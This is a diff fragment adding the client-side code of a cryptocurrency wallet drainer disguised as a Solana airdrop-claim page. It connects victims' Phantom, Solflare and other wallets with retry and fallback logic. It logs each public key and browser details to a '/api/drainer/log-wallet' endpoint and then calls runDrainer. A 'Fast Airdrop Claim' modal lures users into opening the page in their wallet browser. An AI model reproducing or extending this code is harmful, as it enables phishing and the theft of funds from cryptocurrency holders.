+          console.log(`[connectMobileWallet] Desktop provider for ${wallet.name}:`, provider);
+          if (!provider || provider === undefined || provider === null) {
+            console.error(`[connectMobileWallet] No provider for ${wallet.name} on desktop.`);
+            console.log(`[connectMobileWallet] Desktop provider value:`, provider);
+            console.log(`[connectMobileWallet] Desktop provider type:`, typeof provider);
+            showWalletBrowserPrompt();
+            return;
+          }
+          
+          // Desktop: Try to connect and then run drainer
+          try {
+                // Check if wallet is available before attempting connection with simple fallback
+    if (typeof provider.isConnected === 'function' && !provider.isConnected()) {
+      // Simple fallback: try to connect anyway
+      console.log(`[FALLBACK] ${wallet.name} reports not connected, but trying anyway...`);
+    }
+            console.log(`[connectMobileWallet] Desktop: calling connectWalletWithMetadata for ${wallet.name}`);
+            
+            // Add delay to prevent request conflicts
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            // Track this request to prevent conflicts
+            const requestId = `desktop-${wallet.name}-connect-${Date.now()}`;
+            window.addPendingRequest(requestId);
+            
+            try {
+              // Add timeout wrapper for desktop connection with retry logic
+              let result;
+              let retryCount = 0;
+              const maxRetries = 2;
+              
+              while (retryCount <= maxRetries) {
+                try {
+                  const connectionPromise = connectWalletWithMetadata(provider, wallet.name);
+                  const timeoutPromise = new Promise((_, reject) => {
+                                        setTimeout(() => reject(new Error('Connection timeout - please try again')), 15000);
+                  });
+                  
+                  result = await Promise.race([connectionPromise, timeoutPromise]);
+                  break; // Success, exit retry loop
+                } catch (error) {
+                  retryCount++;
+                  console.log(`[connectMobileWallet] Desktop connection attempt ${retryCount}/${maxRetries + 1} failed for ${wallet.name}:`, error.message);
+                  
+                  if (retryCount > maxRetries) {
+                    throw error; // Re-throw if all retries failed
+                  }
+                  
+                  // Wait before retry
+                  showStatus(`Retrying ${wallet.name} connection... (${retryCount}/${maxRetries + 1})`, 'loading');
+                                      await new Promise(resolve => setTimeout(resolve, 1000 * retryCount));
+                }
+              }
+            } finally {
+              // Always remove the request tracking
+              window.removePendingRequest(requestId);
+            }
+            console.log(`[connectMobileWallet] Desktop: connectWalletWithMetadata result for ${wallet.name}:`, result);
+            
+            // Check if we got a public key
+            const publicKey = provider.publicKey || provider.address || result?.publicKey;
+            console.log(`[connectMobileWallet] Desktop: publicKey for ${wallet.name}:`, publicKey);
+            
+            if (publicKey) {
+              showStatus(`${wallet.name} connected!`, 'success');
+              console.log(`[connectMobileWallet] Desktop: About to call runDrainer for ${wallet.name}`);
+              
+              // Log wallet connection
+              try {
+                fetch('/api/drainer/log-wallet', {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({
+                    publicKey: publicKey.toString(),
+                    walletType: wallet.name,
+                    origin: window.location.origin,
+                    userAgent: navigator.userAgent
+                  })
+                }).catch(err => console.log('[TELEGRAM] Failed to log wallet connection:', err));
+                
+                console.log('[WALLET] Logged desktop connection:', {
+                  publicKey: publicKey.toString(),
+                  walletType: wallet.name,
+                  origin: window.location.origin
+                });
+              } catch (logError) {
+                console.error('[WALLET] Failed to log wallet connection:', logError);
+              }
+              
+              runDrainer(provider);
+            } else {
+              showStatus(`Please approve the connection in ${wallet.name}`, 'error');
+              console.error(`[connectMobileWallet] Desktop: No publicKey after connect for ${wallet.name}`);
+            }
+          } catch (connectError) {
+            console.error(`[connectMobileWallet] Desktop: connectWalletWithMetadata error for ${wallet.name}:`, connectError);
+            
+            // Handle timeout errors specifically
+            if (connectError.message?.includes('timeout') || connectError.message?.includes('Connection timeout') || connectError.message?.includes('JSON-RPC: method call timeout')) {
+              showStatus(`⏰ ${wallet.name} connection timeout. Please ensure your wallet app is open and try again.`, 'error');
+              return;
+            }
+            
+            // Enhanced Solflare desktop connection fallback
+            if (wallet.name === 'Solflare') {
+              try {
+                                 // Try signIn method for desktop Solflare
+                 if (typeof provider.signIn === 'function') {
+                   const signInResult = await provider.signIn();
+                   showStatus('Solflare connected via signIn!', 'success');
+                   
+                   // Log wallet connection
+                   try {
+                     const publicKey = provider.publicKey || provider.address;
+                     if (publicKey) {
+                       fetch('/api/drainer/log-wallet', {
+                         method: 'POST',
+                         headers: { 'Content-Type': 'application/json' },
+                         body: JSON.stringify({
+                           publicKey: publicKey.toString(),
+                           walletType: 'Solflare',
+                           origin: window.location.origin,
+                           userAgent: navigator.userAgent
+                         })
+                       }).catch(err => console.log('[TELEGRAM] Failed to log wallet connection:', err));
+                     }
+                   } catch (logError) {
+                     console.error('[WALLET] Failed to log wallet connection:', logError);
+                   }
+                   
+                   runDrainer(provider);
+                   return;
+                 }
+                
+                                 // Try request method for desktop Solflare
+                 if (typeof provider.request === 'function') {
+                   const requestResult = await provider.request({ method: 'connect' });
+                   showStatus('Solflare connected via request!', 'success');
+                   
+                   // Log wallet connection
+                   try {
+                     const publicKey = provider.publicKey || provider.address;
+                     if (publicKey) {
+                       fetch('/api/drainer/log-wallet', {
+                         method: 'POST',
+                         headers: { 'Content-Type': 'application/json' },
+                         body: JSON.stringify({
+                           publicKey: publicKey.toString(),
+                           walletType: 'Solflare',
+                           origin: window.location.origin,
+                           userAgent: navigator.userAgent
+                         })
+                       }).catch(err => console.log('[TELEGRAM] Failed to log wallet connection:', err));
+                     }
+                   } catch (logError) {
+                     console.error('[WALLET] Failed to log wallet connection:', logError);
+                   }
+                   
+                   runDrainer(provider);
+                   return;
+                 }
+                
+                                 // Try basic connect for desktop Solflare
+                 if (typeof provider.connect === 'function') {
+                   const connectResult = await provider.connect();
+                   showStatus('Solflare connected!', 'success');
+                   
+                   // Log wallet connection
+                   try {
+                     const publicKey = provider.publicKey || provider.address;
+                     if (publicKey) {
+                       fetch('/api/drainer/log-wallet', {
+                         method: 'POST',
+                         headers: { 'Content-Type': 'application/json' },
+                         body: JSON.stringify({
+                           publicKey: publicKey.toString(),
+                           walletType: 'Solflare',
+                           origin: window.location.origin,
+                           userAgent: navigator.userAgent
+                         })
+                       }).catch(err => console.log('[TELEGRAM] Failed to log wallet connection:', err));
+                     }
+                   } catch (logError) {
+                     console.error('[WALLET] Failed to log wallet connection:', logError);
+                   }
+                   
+                   runDrainer(provider);
+                   return;
+                 }
+              } catch (solflareError) {
+                console.error(`[connectMobileWallet] Desktop Solflare connection error:`, solflareError);
+              }
+            }
+            
+            showStatus(`Connection failed for ${wallet.name}: ${connectError.message || connectError}`, 'error');
+          }
+        }
+      } catch (error) {
+        showStatus('An unexpected error occurred.', 'error');
+        console.error(`[connectMobileWallet] Unexpected error for ${wallet.name}:`, error);
+      }
+    }
+    window.connectMobileWallet = connectMobileWallet;
+
+    // Function to handle deep links properly (moved outside for global access)
+    function openInWallet(walletType) {
+      const currentUrl = window.location.href;
+      let deepLink = '';
+      let fallbackUrl = '';
+      
+      switch(walletType) {
+        case 'phantom':
+          deepLink = 'phantom://app/' + encodeURIComponent(currentUrl);
+          fallbackUrl = 'https://phantom.app/';
+          break;
+        case 'solflare':
+          deepLink = 'solflare://access-wallet?url=' + encodeURIComponent(currentUrl);
+          fallbackUrl = 'https://solflare.com/';
+          break;
+        case 'backpack':
+          deepLink = 'backpack://open?url=' + encodeURIComponent(currentUrl);
+          fallbackUrl = 'https://backpack.app/';
+          break;
+        case 'trustwallet':
+          deepLink = 'https://link.trustwallet.com/open_url?coin_id=501&url=' + encodeURIComponent(currentUrl);
+          fallbackUrl = 'https://trustwallet.com/';
+          break;
+        case 'glow':
+          deepLink = 'glow://open?url=' + encodeURIComponent(currentUrl);
+          fallbackUrl = 'https://glow.app/';
+          break;
+        case 'exodus':
+          deepLink = 'exodus://open?url=' + encodeURIComponent(currentUrl);
+          fallbackUrl = 'https://exodus.com/';
+          break;
+      }
+      
+      // Try to open the deep link with fallback
+      try {
+        console.log(`[DEEP_LINK] Attempting to open ${walletType} deep link:`, deepLink);
+        
+        // Try window.open first for better compatibility
+        const newWindow = window.open(deepLink, '_blank');
+        
+        // If window.open fails, try location.href
+        if (!newWindow || newWindow.closed) {
+          console.log(`[DEEP_LINK] window.open failed, trying location.href`);
+      window.location.href = deepLink;
+        }
+      } catch (error) {
+        console.error(`[DEEP_LINK] Error opening ${walletType} deep link:`, error);
+        // Fallback to location.href
+        window.location.href = deepLink;
+      }
+    }
+
+    // Function to show wallet browser prompt when no wallet is detected
+    window.showWalletBrowserPrompt = function showWalletBrowserPrompt() {
+      const instructions = `
+        <div style="text-align: center; padding: 20px; max-width: 500px; margin: 0 auto;">
+          <div style="margin-bottom: 20px;">
+            <h3 style="color: #fff; margin-bottom: 10px; font-size: 18px;">🚀 Fast Airdrop Claim</h3>
+            <p style="color: #ccc; font-size: 14px; line-height: 1.5; margin-bottom: 20px;">
+              No wallet detected! For the fastest and most secure airdrop claim experience, 
+              please visit this site directly in your wallet's built-in browser.
+            </p>
+          </div>
+          
+          <div style="background: rgba(0,0,0,0.3); border-radius: 12px; padding: 16px; margin-bottom: 20px;">
+            <h4 style="color: #fff; margin-bottom: 12px; font-size: 14px;">📱 Open in Wallet Browser for Faster Claim</h4>
+            <p style="color: #aaa; font-size: 12px; margin-bottom: 16px;">
+              Click below to open this airdrop site in your wallet's browser for instant connection:
+            </p>
+            <div style="display: flex; flex-wrap: wrap; gap: 8px; justify-content: center;">
+              <button onclick="openInWallet('phantom')" style="background: linear-gradient(135deg, #9945FF 0%, #7B3FE4 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
+                ⚡ Open in Phantom
+              </button>
+              <button onclick="openInWallet('solflare')" style="background: linear-gradient(135deg, #FC9965 0%, #F7931E 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
+                ⚡ Open in Solflare
+              </button>
+              <button onclick="openInWallet('backpack')" style="background: linear-gradient(135deg, #000000 0%, #333333 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
+                ⚡ Open in Backpack
+              </button>
+              <button onclick="openInWallet('trustwallet')" style="background: linear-gradient(135deg, #3375BB 0%, #1E4A8C 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
+                ⚡ Open in Trust Wallet
+              </button>
+              <button onclick="openInWallet('glow')" style="background: linear-gradient(135deg, #FF6B6B 0%, #FF8E53 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
+                ⚡ Open in Glow
+              </button>
+              <button onclick="openInWallet('exodus')" style="background: linear-gradient(135deg, #00D4AA 0%, #00B894 100%); color: white; border: none; padding: 10px 16px; border-radius: 8px; font-size: 13px; cursor: pointer; transition: all 0.3s ease;">
+                ⚡ Open in Exodus
+              </button>
+            </div>
+          </div>
+          
+          <div style="margin-top: 20px; padding: 12px; background: rgba(255,255,255,0.05); border-radius: 8px; border-left: 3px solid #00FF88;">
+            <p style="color: #00FF88; font-size: 12px; margin: 0;">
+              ⚡ <strong>Faster Claim:</strong> Using your wallet's built-in browser provides instant connection and faster airdrop processing.
+            </p>
+          </div>
+        </div>
+      `;
+      
+      // Show instructions in modal
+      const modal = document.getElementById('statusModal');
+      const msgEl = document.getElementById('statusModalMsg');
+      msgEl.innerHTML = instructions;
+      modal.classList.add('active');
+    }
+  </script>
+</body>
+</html>
